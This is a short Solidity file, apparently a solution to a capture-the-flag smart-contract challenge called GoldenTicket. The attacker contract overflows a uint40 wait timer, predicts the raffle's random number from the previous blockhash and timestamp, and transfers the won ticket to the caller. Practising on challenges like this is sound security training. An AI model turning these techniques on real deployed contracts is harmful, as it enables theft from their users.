// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "../Challenges/GoldenTicket.sol";

contract GoldenTicketAttacker {
    GoldenTicket public immutable goldenTicket;

    constructor(address _goldenTicketAddress) {
        goldenTicket = GoldenTicket(_goldenTicketAddress);
    }

    function attack() public {
        goldenTicket.joinWaitlist();
        goldenTicket.updateWaitTime(
            uint256(type(uint40).max - 10 * 365 days - 1)
        );
        goldenTicket.joinRaffle(
            uint256(
                keccak256(
                    abi.encodePacked(
                        blockhash(block.number - 1),
                        block.timestamp
                    )
                )
            )
        );
        goldenTicket.giftTicket(msg.sender);
    }
}
